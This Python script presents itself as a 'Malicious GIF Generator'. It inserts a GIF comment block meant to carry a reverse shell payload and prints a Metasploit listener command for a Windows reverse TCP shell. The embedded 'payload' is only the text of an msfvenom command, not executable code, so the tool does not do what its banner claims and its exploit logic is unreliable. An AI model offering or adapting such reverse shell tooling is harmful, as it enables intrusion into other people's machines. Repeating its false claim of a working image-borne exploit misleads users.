import sys 
import os 
from struct import pack
from colorama import Fore, Style

# Colorful ASCII Art
def print_banner():
    print(Fore.RED + r"""
   _____ _____ _____    ___ ___   ___         _   ___ ___ 
  |  ___|  ___|_   _|  / _ \__ \ / _ \       / | / _ \__ \
  | |_  | |_    | |   | (_) | ) | | | |      | || (_) | ) |
  |  _| |  _|   | |    \__, / /| | | |      _| | \__, / / 
  |_|   |_|     |_|      /_/____\___/       (_)_|   /_/____
    """ + Fore.GREEN + "Malicious GIF Generator" + Style.RESET_ALL)
    print(Fore.YELLOW + "~"*50 + Style.RESET_ALL)
    print(Fore.CYAN + "Creates GIF files with embedded reverse shell payloads")
    print(Fore.MAGENTA + "Use responsibly and only on systems you own!" + Style.RESET_ALL)
    print(Fore.YELLOW + "~"*50 + Style.RESET_ALL + "\n")

def generate_malicious_gif(original_gif_path, output_filename, lhost, lport):
    """ Generate a malicious GIF file with embedded reverse shell payload

    Args:
        original_gif_path (str): Path to the original GIF file
        output_filename (str): Name for the output malicious GIF
        lhost (str): IP address for the reverse shell to connect to
        lport (int): Port for the reverse shell to connect to
    """
    # Basic validation
    if not os.path.exists(original_gif_path):
        print(Fore.RED + f"[!] Error: File '{original_gif_path}' not found." + Style.RESET_ALL)
        return False

    if not lport.isdigit() or not (1 <= int(lport) <= 65535):
        print(Fore.RED + "[!] Error: Port must be between 1 and 65535" + Style.RESET_ALL)
        return False

    try:
        # Read the original GIF file
        with open(original_gif_path, 'rb') as f:
            gif_data = f.read()
        
        # Generate the Metasploit reverse shell payload
        payload = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe".encode('utf-8')
        
        # GIF Comment Extension structure:
        comment_extension = (
            b'\x21\xFE' +                  # GIF Comment Extension identifier
            pack('B', len(payload)) +       # Length byte
            payload +                       # Our payload
            b'\x00'                         # Terminator
        )
        
        # Insert the comment extension
        malicious_gif = (
            gif_data[:13] +                 # GIF header + logical screen descriptor
            comment_extension +             # Our malicious comment
            gif_data[13:]                   # Rest of the original GIF
        )
        
        # Write the malicious GIF
        with open(output_filename, 'wb') as f:
            f.write(malicious_gif)
        
        print(Fore.GREEN + f"[+] Malicious GIF generated as '{output_filename}'" + Style.RESET_ALL)
        print(Fore.BLUE + "[+] Set up Metasploit listener with:" + Style.RESET_ALL)
        print(Fore.YELLOW + f"    msfconsole -q -x 'use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'" + Style.RESET_ALL)
        
        return True

    except Exception as e:
        print(Fore.RED + f"[!] Error: {str(e)}" + Style.RESET_ALL)
        return False

if __name__ == "__main__":
    print_banner()
    if len(sys.argv) != 5:
        print(Fore.CYAN + "Usage: python gif_payload.py <original_gif_path> <output_filename> <LHOST> <LPORT>")
        print(Fore.CYAN + "Example: python gif_payload.py innocent.gif malicious.gif 192.168.1.100 4444" + Style.RESET_ALL)
        sys.exit(1)

    original_gif = sys.argv[1]
    output_file = sys.argv[2]
    ip_addr = sys.argv[3]
    port = sys.argv[4]

    generate_malicious_gif(original_gif, output_file, ip_addr, port)
